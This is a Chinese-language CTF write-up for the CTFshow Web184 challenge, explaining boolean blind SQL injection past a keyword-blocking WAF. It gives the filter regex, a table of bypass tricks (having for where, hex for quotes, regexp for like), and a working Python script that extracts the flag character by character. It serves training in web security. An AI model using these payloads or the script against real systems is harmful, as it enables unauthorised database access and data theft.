### 📌 一、题目信息

- **题目名称**：CTFshow Web184
- **漏洞类型**：布尔盲注（基于正则匹配）
- **关键变化**：WAF升级 + 返回结果固定为0（但可被改变）

---

### 🔍 二、代码分析对比

#### Web183 vs Web184

| 维度         | Web183                         | Web184                                                       |
| :----------- | :----------------------------- | :----------------------------------------------------------- |
| **查询语句** | `select count(pass) from ...;` | `select count(*) from ...;`                                  |
| **返回结果** | `$user_count = 1;` (或0)       | **`$user_count = 0;`** (固定，但注入成功时会变)              |
| **WAF过滤**  | 空格、`=`、`select`、`flag`等  | **新增过滤**：`where`, `'` `"`, `union`, ```, `sleep`, `benchmark` \| |

---

### 🛡️ 三、WAF过滤规则（Web184）

```php
function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
}
```

**被过滤的内容：**

- 🚫 特殊符号：`*` `#` `|` `=` `&` `'` `"` ```
- 🚫 关键词：`file` `or` `select` `and` `flag` `into` `where` `union` `sleep` `benchmark`
- 🚫 各种空白字符

**✅ 没被过滤的关键词：**

- `group by`
- `having`
- `regexp`
- `0x`（十六进制）

---

### 💡 四、绕过思路

#### 1️⃣ 核心payload格式

```sql
ctfshow_user group by pass having pass regexp(0x{十六进制flag})
```

#### 2️⃣ 绕过技巧

| 🚫 WAF过滤  | ✅ 绕过方法           | 📝 示例                          |
| :--------- | :------------------- | :------------------------------ |
| `where`    | 用 `having` 代替     | `group by ... having`           |
| `'` 和 `"` | 用十六进制           | `0x63746673686f777b` (ctfshow{) |
| `like`     | 用 `regexp` 代替     | `regexp(0x...)`                 |
| `select`   | 不需要用（外层已有） | -                               |
| `flag`     | 放在十六进制里       | `0x666c6167`                    |

---

### 🎲 五、注入原理

#### 1️⃣ 最终执行的SQL

```sql
select count(*) from ctfshow_user group by pass having pass regexp(0x63746673686f777b61
```

（假设当前flag=`ctfshow{`，猜下一个字符`a`）

#### 2️⃣ 执行逻辑

- `group by pass`：按pass字段分组
- `having pass regexp(0x...)`：只保留那些pass匹配正则表达式的组
- `count(*)`：统计符合条件的行数

#### 3️⃣ 返回结果

- ✅ 如果有以`ctfshow{a`开头的pass → 至少有一组符合 → `count(*)` ≥ 1 → 页面显示`user_count = 1`（或其他数字）
- ❌ 如果没有 → 0行符合 → 页面显示`user_count = 0`

**关键：** 虽然题目说固定返回0，但注入成功时页面内容会变化！

---

### 🤖 六、自动化脚本

```python
import requests

# 目标URL
TARGET_URL = 'http://目标网址/select-waf.php'

# flag中可能出现的字符
CHAR_SET = "{0123456789abcdefghijklmnopqrstuvwxyz-}"

# 存储最终的flag（十六进制形式）
flag_hex = ""
# 存储明文的flag（用于显示）
flag_text = "ctfshow"

# 最多尝试50个字符
for i in range(50):
    for char in CHAR_SET:
        # 将字符转为十六进制（去掉0x前缀）
        hex_char = hex(ord(char))[2:]
        
        # 构造payload
        data = {
            "tableName": f"ctfshow_user group by pass having pass regexp(0x{flag_hex + hex_char})"
        }
        
        # 发送请求
        response = requests.post(url=TARGET_URL, data=data)
        
        # 判断是否匹配成功
        if 'user_count = 1' in response.text:
            flag_text += char
            print(f"Found: {flag_text}")
            
            flag_hex += hex_char
            
            if char == '}':
                print(f"Flag complete: {flag_text}")
                exit()
            break
```

---



### 📚 八、关键知识点总结

#### 1️⃣ MySQL语法特性

- `group by` + `having` = 分组后筛选（可代替`where`）
- `regexp` = 正则表达式匹配（比`like`更强大）
- 十六进制字面量 `0x...` = 字符串（绕过引号过滤）

#### 2️⃣ WAF绕过思路

1. 先看**过滤了什么** → 列出黑名单
2. 再看**没过滤什么** → 找出可用关键词
3. 用没过滤的替代被过滤的
4. 用十六进制处理字符串

#### 3️⃣ 绕过技巧速查表

| 被过滤              | 替代方案                 |
| :------------------ | :----------------------- |
| `where`             | `group by ... having`    |
| `'` 或 `"`          | 十六进制 `0x...`         |
| `like`              | `regexp`                 |
| `=`                 | `regexp` 或 `like`       |
| `sleep`/`benchmark` | 利用逻辑判断改变页面内容 |

---

### 💭 九、解题思路总结

1. **👀 看能控制什么** → `tableName`参数
2. **🔍 看WAF过滤了什么** → 逐个测试被过滤的关键词
3. **💡 找没过滤的关键词** → `group by`、`having`、`regexp`、`0x`
4. **🔧 构造payload** → 用没过滤的关键词组合
5. **📊 观察返回变化** → 虽然官方说返回0，但注入成功时页面内容会变
6. **🤖 写脚本自动化** → 逐字符爆破

---

